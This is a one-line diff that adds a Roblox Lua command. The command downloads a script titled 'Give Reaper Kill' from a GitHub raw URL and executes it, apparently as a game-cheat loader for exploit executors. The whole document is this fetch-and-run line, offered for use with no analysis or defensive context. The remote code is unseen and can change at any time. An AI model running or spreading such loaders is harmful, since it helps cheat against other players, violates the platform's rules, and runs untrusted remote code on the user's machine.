@@ -1,0 +1,1 @@
+loadstring(Game:HttpGet("https://raw.githubusercontent.com/thanhdat4461/BaconScripterLua/main/Give%20Reaper%20Kill.lua"))()
